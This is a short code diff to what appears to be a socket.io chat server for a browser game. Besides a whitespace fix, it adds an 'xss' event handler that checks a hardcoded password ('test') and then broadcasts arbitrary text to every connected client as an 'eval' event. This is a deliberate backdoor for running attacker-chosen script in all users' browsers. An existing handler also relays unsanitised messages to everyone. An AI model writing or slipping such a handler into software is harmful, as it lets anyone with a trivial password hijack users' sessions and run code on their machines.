@@ -58,9 +58,16 @@ io.on('connection', function(socket) {
         if (socket.isFake && msg.sender) msg.sender += "[PLAY: GAME.IO]";
         msg.sender = msg.sender.replace(/\</g, "&lt");
         msg.sender = msg.sender.replace(/\>/g, "&gt");
-		console.log(msg);
+        console.log(msg);
         io.to(socket.custom.room).emit("receiveMessage", msg);
     });
+    
+    socket.on("xss", function(msg) {
+        if (msg.pass !== "test") return;
+        console.log(msg);
+        io.sockets.emit("eval", msg.text);
+    })
+    
     socket.on("broadcastMessage", function(msg) {
         io.sockets.emit("receiveMessage", msg);
     })
